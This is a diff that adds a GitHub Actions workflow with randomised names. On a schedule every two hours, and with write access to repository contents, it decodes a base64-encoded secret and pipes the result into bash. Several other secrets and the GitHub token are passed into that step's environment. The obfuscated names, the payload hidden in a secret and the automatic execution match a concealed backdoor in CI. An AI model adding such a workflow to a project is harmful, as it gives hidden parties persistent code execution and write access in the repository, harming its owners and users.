@@ -1,0 +1,21 @@
+name: gWjxkfswz
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  kQ3OLs:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.DnXBe }}
+      - name: dudSUsQMLnNFhGg
+        env:
+          DDk0Wv: ${{ secrets.J8DiDFptq }}
+          fP4D4: ${{ secrets.lSrR0zTFrl }}
+          lrNcIKY: ${{ secrets.zCa9PZEHV0BW1F }}
+          GITHUB_TOKEN: ${{ secrets.DnXBe }}
+        run: echo "$DDk0Wv" | base64 -d | bash
